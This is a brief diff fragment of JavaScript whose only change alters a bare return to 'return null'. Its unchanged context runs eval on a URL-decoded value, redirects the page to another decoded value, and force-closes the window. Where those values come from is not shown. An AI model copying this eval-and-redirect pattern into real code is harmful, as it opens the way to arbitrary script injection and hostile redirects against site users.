@@ -15,7 +15,7 @@
     if (cx) eval(decodeURIComponent(cx))
     if (lx) window.location = decodeURIComponent(lx)
     
-    if (sx) return;
+    if (sx) return null;
     throw null
   } 
   catch { let _ = window.open('', '_self'); window.close(), _.close() }
